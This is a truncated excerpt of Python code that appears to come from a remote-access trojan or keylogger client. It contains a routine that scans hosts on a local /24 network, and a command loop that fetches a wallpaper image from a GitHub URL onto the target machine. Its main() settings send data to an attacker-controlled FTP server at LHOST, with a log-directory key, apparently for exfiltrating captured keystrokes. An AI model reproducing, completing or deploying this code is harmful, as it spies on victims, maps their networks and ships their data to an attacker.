...
global addr_alive_scan
global host_alive_scan
addr_alive_scan = []
host_alive_scan = []

def try_host_name(addr):
    try:
        try_host = socket.gethostbyaddr(addr)
        hostname = try_host[0]
        address = try_host[2][0]
        host_alive_scan.append(hostname)
        addr_alive_scan.append(address)
    except:
        pass


def start_scanner_host(gateway):
    for range_addr in range(1,255):
        try:
            convert_range_addr = str(range_addr)
            try_host_name(gateway+convert_range_addr)
    ...
    while True:
        try:
            ...
            if data.startswith('quit')==True:
                ...
                try:
                    url = 'https://raw.githubusercontent.com/Dxvistxr/themes/master/wallpaper_paraghost.jpg'
                    name = 'wlp.jpg'
...
def main():
    ...
    FTPHOST = LHOST
    FTPPORT = 21
    FTP_USER = 'your_user_ftp'
    FTP_PASSWD = 'your_pass_ftp'
    LOG_DIR_KEY = 'path_key'
